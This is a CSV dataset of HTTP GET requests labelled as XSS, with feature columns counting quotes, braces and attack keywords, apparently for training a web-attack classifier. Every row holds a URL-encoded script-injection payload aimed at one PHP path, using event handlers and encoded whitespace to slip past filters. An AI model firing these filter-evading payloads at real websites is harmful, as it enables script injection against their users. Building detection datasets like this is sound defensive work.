method,path,body,single_q,double_q,dashes,braces,spaces,SQL Badwords,XSS Badwords,Command Injection Badords,class
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250a%28prompt%29%60%60%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%2509%3d%2509%28prompt%29%60%60%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onpointerenter%250d%3d%250dconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250aconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%2509%3d%2509confirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250d%3d%250da%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%2b%3d%2ba%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250a%3d%250aconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250d%3d%250da%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250a%3d%250a%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250d%3d%250dconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%2509%3d%2509%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250d%3d%250d%5b8%5d.find%28confirm%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250a%3d%250a%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250d%3d%250dconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250a%3d%250a%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2509%3d%2509%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250a%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250aa%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onpointerenter%250d%3d%250d%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250d%3d%250d%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onpointerenter%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%2b%3d%2b%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onpointerenter%250d%3d%250dconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%2b%3d%2bconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250a%3d%250aconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%2b%3d%2b%28prompt%29%60%60%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%2b%3d%2b%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%2b%3d%2b%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250d%3d%250dconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250a%3d%250a%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250d%3d%250d%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%2509%3d%2509%28prompt%29%60%60%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250a%3d%250aconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2509%3d%2509%28prompt%29%60%60%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250d%3d%250da%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2b%3d%2b%5b8%5d.find%28confirm%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2b%3d%2b%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%250a%3d%250aconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250d%3d%250dconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250a%3d%250a%5b8%5d.find%28confirm%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250a%3d%250a%5b8%5d.find%28confirm%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2b%3d%2b%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2b%3d%2ba%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%2509%3d%2509%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%2509%3d%2509%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%250a%3d%250a%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250d%3d%250d%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250a%3d%250a%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250a%3d%250aconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2509%3d%2509%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2b%3d%2b%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%2b%3d%2b%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250a%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250d%3d%250dconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onpointerenter%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250aconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2509onmouseover%250a%3d%250a%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%2509%3d%2509confirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250aonpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250d%3d%250da%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%2b%3d%2bconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%2b%3d%2b%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%2509%3d%2509a%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%250a%3d%250aconfirm%28%29%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donpointerenter%250d%3d%250da%3dprompt%2ca%28%29%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%250donmouseover%2509%3d%2509confirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%2509%3d%2509%28confirm%29%28%29%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250a%3d%250a%28prompt%29%60%60%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%250d%3d%250d%28prompt%29%60%60%250dx%2f%2f3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonpointerenter%250d%3d%250d%28confirm%29%28%29%250dx%2f%2f3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3chtml%2f%2b%2fonmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2f3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250a%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250a%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2b%3d%2bconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2509%3d%2509confirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2b%3d%2bconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250a%3d%250aconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250d%3d%250d%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509confirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250d%3d%250d%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250d%3d%250d%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250a%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250aconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2b%3d%2b%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2b%3d%2b%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2b%3d%2b%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250d%3d%250dconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2509%3d%2509a%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2509%3d%2509%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250d%3d%250da%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250a%3d%250a%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250d%3d%250d%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250d%3d%250da%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2b%3d%2ba%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250aconfirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250d%3d%250d%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2509%3d%2509%28confirm%29%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2b%3d%2b%5b8%5d.find%28confirm%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2b%3d%2b%28confirm%29%28%29%2f%2fv3dm0s3nd,,0,0,0,2,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onpointerenter%2b%3d%2ba%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%2509%3d%2509a%3dprompt%2ca%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%2509onmouseover%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonmouseover%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonmouseover%2509%3d%2509%28prompt%29%60%60%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonmouseover%2509%3d%2509%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonmouseover%2509%3d%2509confirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonmouseover%2509%3d%2509%5b8%5d.find%28confirm%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonpointerenter%250a%3d%250a%28prompt%29%60%60%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonpointerenter%250d%3d%250dconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonpointerenter%250a%3d%250aconfirm%28%29%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonpointerenter%250a%3d%250aa%3dprompt%2ca%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,2,0,XSS
GET,/multi/js-object3.php?p=st4r7s%3ca%250aonpointerenter%2509%3d%2509confirm%28%29%250dx%2f%2fv3dm0s3nd,,0,0,0,1,0,0,1,0,XSS
